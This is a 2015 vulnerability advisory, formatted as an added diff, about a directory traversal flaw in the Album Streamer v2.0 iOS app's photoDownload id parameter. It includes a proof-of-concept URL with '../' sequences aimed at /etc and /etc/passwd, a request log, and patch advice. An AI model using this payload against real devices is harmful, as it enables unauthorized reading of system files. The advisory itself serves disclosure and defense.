@@ -1,0 +1,204 @@
+Document Title:
+===============
+Album Streamer v2.0 iOS - Directory Traversal Vulnerability
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1481
+
+
+Release Date:
+=============
+2015-05-07
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1481
+
+
+Common Vulnerability Scoring System:
+====================================
+6.6
+
+
+Product & Service Introduction:
+===============================
+1 Tap - Quick, Album Streamer, best Photo/Video Transfer app ever! Quick way to share your Album Photos and 
+Videos to your computer. It takes only single tap to stream and download all/selected photos or videos. 
+You can even view or play slide show of all your photos directly on the computer without downloading.
+
+(Copy of the Homepage: https://itunes.apple.com/DE/app/id835284235 )
+
+
+Abstract Advisory Information:
+==============================
+The Vulnerability Laboratory Research Team discovered a directory traversal web vulnerability in the official Album Streamer v2.0 iOS mobile web-application.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2015-05-07:	Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Spider Talk
+Product: Album Streamer - iOS Mobile Web Application (Wifi) 2.0
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+A Path Traveral web vulnerability has been discovered in the official Album Streamer v2.0 iOS mobile web-application.
+The security vulnerability allows a remote attacker to unauthorized request system path variables to compromise the 
+mobile application or apple iOS device.
+
+The vulnerability is located in the `id` request to the `path` value of the photoDownload module. The vulnerability can be exploited by 
+local or remote attackers without user interaction. The attacker needs to replace the picture assets id path request of the photoDownload 
+module with a malicious payload like ./etc/passwd ./etc/hosts. The attack vector is located on the application-side of the service and 
+the request method to execute is GET (client-side).
+
+The security risk of the path traversal web vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 6.6. 
+Exploitation of the directory traversal web vulnerability requires no privileged application user account or user interaction. 
+Successful exploitation of the vulnerability results in mobile application compromise
+
+Request Method(s):
+				[+] GET
+
+Vulnerable Module(s):
+				[+] photoDownload
+
+Vulnerable Parameter(s):
+				[+] id
+
+Affected Module(s):
+				[+] photoDownload Item Index
+
+
+Proof of Concept (PoC):
+=======================
+The vulnerability can be exploited by remote attackers without privileged application user account or user interaction.
+For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.
+
+PoC: http://localhost/photoDownload?id=[DIRECTORY TRAVERSAL]../../../../../../../etc
+
+
+Vulnerable Source(s): localhost/photoDownload
+<div class="thumbnailBorder"><div class="thumbnailPicture"><img class="showPreviewModalPopup" src="/photoTbDownload?id=id0" border="0" height="100px" width="100px"></div><div id="thumbnailTitle"><input id="id0" name="photoCheckbox" type="checkbox"> <a href="/photoDownload?id=id0">asset.JPG</a></div></div><div class="thumbnailBorder"><div class="thumbnailPicture"><img class="showPreviewModalPopup" src="/photoTbDownload?id=id1" border="0" height="100px" width="100px"></div><div id="thumbnailTitle"><input id="id1" name="photoCheckbox" type="checkbox"> <a href="/photoDownload?id=id1">asset.PNG</a></div></div>
+
+        <!-- PREVIEW SECTION -->
+        <div style="display: none;" id="overlay"></div>
+        
+        <div style="display: none;" id="popupBox">
+            <div style="display: none;" id="popupContent">
+                <img class="previewLoadingImage" id="previewLoading" src="/loading.gif">
+                
+                <img class="previewImage" src="/photoDownload?id=id1">
+                
+                <img src="/imgAlbumStreamPrev.png" class="btnShowPrev" height="25px" width="25px">
+                
+                <img src="/imgAlbumStreamNext.png" class="btnShowNext" height="25px" width="25px">
+                
+            </div>
+        </div>
+
+        <!-- BREAK -->
+        <div class="sectionBreak"> </div>
+
+        <!-- VIDEOS SECTION -->
+        <div>
+            <h1>
+                <input class="videoAllCheckBox" id="videoAllCheckBox" type="checkbox"> Videos 
+                <input class="btnVideoDownload" value="Download (Selected)" type="button"> 
+            </h1>
+        </div>
+
+--- Poc Session Logs [GET] ---
+Status: 200[OK]
+GET http://localhost/photoDownload?id=../../../../etc Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[25568] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Connection[keep-alive]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[25568]
+      Content-Disposition[: attachment; filename=asset.JPG]
+      Date[Thu, 30 Apr 2015 13:29:14 GMT]
+
+
+
+Reference(s):
+http://localhost/
+http://localhost/photoDownload
+
+
+Solution - Fix & Patch:
+=======================
+The vulnerability can be patched by a secure parse of the id value in the photoDownload module.
+Restrict the input and disallow special chars to prevent further path traversal attacks.
+implement a whitelist to request only authroized urls through the mobile app api.
+
+
+Security Risk:
+==============
+The security risk of the directory traversal vulnerability in the wifi interface is estimated as high. (CVSS 6.6)
+
+
+Credits & Authors:
+==================
+Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
+or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
+in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
+or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
+consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
+policies, deface websites, hack into databases or trade with fraud/stolen material.
+
+Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
+Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
+Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
+Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
+electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
+is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
+(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
+
+				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+CONTACT: research@vulnerability-lab.com
+PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt
+
+
